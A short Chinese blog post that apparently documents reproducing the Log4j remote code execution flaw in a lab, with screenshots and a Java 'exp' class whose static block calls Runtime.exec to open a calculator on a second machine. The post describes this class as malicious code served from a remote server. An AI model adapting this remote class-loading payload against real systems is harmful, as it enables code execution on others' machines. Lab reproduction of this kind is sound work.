---
title: Log漏洞测试
tags:
  - Log
categories: Log漏洞复现
abbrlink: 2620197646
date: 2021-12-11 12:52:10
description:
---
![liu](https://qingyun-test.oss-cn-hangzhou.aliyuncs.com/img/liu.png?x-oss-process=style/qingyun)

用来打Jar包的类，也是在别的电脑执行的





远程恶意代码实现的服务器（这个就百度怎么实现的）

![qing](https://qingyun-test.oss-cn-hangzhou.aliyuncs.com/img/qing.png?x-oss-process=style/qingyun)

恶意代码内容

```java
import java.io.IOException;

public class exp {
    static {
        try{
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"gtk-launch","firefox"};
            Process exec = rt.exec("calc");
            System.out.println("现在执行命令");
            exec.waitFor();
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }
}

```

就一个打开计算器



![QQ图片20211211124453](https://qingyun-test.oss-cn-hangzhou.aliyuncs.com/img/QQ图片20211211124453.jpg?x-oss-process=style/qingyun)

另外一台电脑执行打的jar包  执行了远程恶意代码  （其实也就打开了计算器）